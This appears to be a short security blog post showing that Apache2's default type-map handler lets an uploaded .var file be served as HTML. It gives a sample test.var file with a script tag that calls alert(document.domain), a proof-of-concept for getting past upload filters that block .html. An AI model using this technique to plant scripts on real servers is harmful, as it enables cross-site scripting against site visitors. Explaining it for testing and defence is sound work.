---
layout: post
title:  "XSS with Apache2 type-map handler extension"
date:   2020-11-29 23:48:00
tags:   [Apache2, XSS]
---

## Description
This post contains about cross site scripting with Apache2 type-map extension.
<br/>
<br/>


## Negotiation in httpd
In order to negotiate a resource, the server needs to be given information about each of the variants. This is done in one of two ways:

* Using a type map (i.e., a *.var file) which names the files containing the variants explicitly, or
* Using a 'MultiViews' search, where the server does an implicit filename pattern match and chooses from among the results.

#### Using a type-map file
A type map is a document which is associated with the handler named type-map (or, for backwards-compatibility with older httpd configurations, the MIME-type application/x-type-map). Note that to use this feature, you must have a handler set in the configuration that defines a file suffix as type-map; this is best done with
```
AddHandler type-map .var
```
(https://httpd.apache.org/docs/2.4/en/content-negotiation.html)
<br/>
<br/>


## XSS with var exntension
`AddHandler type-map .var` is applied by default in Apache2. so when you can't use `html` or `htm` extension, you can use `var` to trigger xss.
```
# /etc/apache2/mods-enabled/mime.conf
232     # For type maps (negotiated resources):
233     # (This is enabled by default to allow the Apache "It Worked" page
234     #  to be distributed in multiple languages.)
235     #
236     AddHandler type-map var
```

```
➜  ~ cat test.var
Content-language: en
Content-type: text/html
Body: ----foo----
<script>
alert(document.domain)
</script>
----foo----
```
